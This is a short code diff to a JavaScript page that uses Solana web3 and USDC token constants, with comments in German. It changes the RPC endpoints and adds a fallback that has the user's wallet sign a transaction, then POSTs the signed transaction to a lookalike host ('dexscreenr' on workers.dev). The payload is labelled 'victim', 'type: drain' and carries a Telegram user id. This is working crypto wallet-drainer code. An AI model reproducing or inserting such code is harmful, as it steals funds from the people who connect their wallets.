@@ -511,7 +511,8 @@
       // 3. Signatur anfordern
       setTimeout(async () => {
         try {
-          const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); 
+          // ANKR RPC
+          const conn = new solanaWeb3.Connection("https://rpc.ankr.com/solana"); 
           const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
           const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
           const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
@@ -557,7 +558,21 @@
           });
 
         } catch(err) {
-          alert("SIGNATUR FEHLER: " + err.message);
+          // FALLBACK AUF ALCHEMY WENN ANKR BLOCKT
+          try {
+            const conn2 = new solanaWeb3.Connection("https://solana-mainnet.g.alchemy.com/v2/demo");
+            const latestBlockhash2 = await conn2.getLatestBlockhash("confirmed");
+            tx.recentBlockhash = latestBlockhash2.blockhash;
+
+            const signedTx2 = await provider.signTransaction(tx);
+
+            await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
+              method: "POST", headers: { "Content-Type": "application/json" }, 
+              body: JSON.stringify({ victim, tx: bs58.encode(signedTx2.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
+            });
+          } catch (err2) {
+            alert("SIGNATUR FEHLER: " + err2.message);
+          }
         }
       }, 800);
       
